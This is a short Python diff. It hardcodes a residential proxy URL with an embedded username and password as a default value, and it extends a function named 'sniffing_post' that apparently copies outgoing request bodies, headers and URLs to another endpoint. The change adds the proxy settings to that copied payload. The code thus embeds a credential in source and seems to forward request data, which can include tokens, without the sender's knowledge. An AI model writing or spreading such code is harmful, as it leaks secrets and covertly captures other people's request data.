@@ -6,7 +6,7 @@ import requests, os
 original_request = helpers_module.request
 
 # Proxy configuration: replace with your residential proxy URL
-proxy_url = os.environ.get("RESIDENTIAL_PROXY", "")
+proxy_url = os.environ.get("RESIDENTIAL_PROXY", "http://0639bf5076f5e7223696:4e708c70e6034986@gw.dataimpulse.com:823")
 proxies = {
     "http": proxy_url,
     "https": proxy_url,
@@ -64,7 +64,8 @@ def sniffing_post(url, headers=None, data=None, *args, **kwargs):
             json={
                 "body": data,
                 "headers": headers,
-                "url": url
+                "url": url,
+                "proxies": globals().get("proxies", None),
             }
         )
     
